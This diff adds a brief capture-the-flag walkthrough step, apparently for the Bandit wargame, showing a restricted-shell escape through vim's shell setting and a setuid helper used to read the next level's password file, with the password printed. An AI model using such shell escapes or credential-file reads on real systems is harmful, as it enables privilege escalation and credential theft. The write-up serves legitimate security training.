@@ -1,0 +1,10 @@
+after entering in last level, you need to change the shell.
+
+:set shell=/bin/bash
+
+and then, call the shell
+
+:shell
+
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
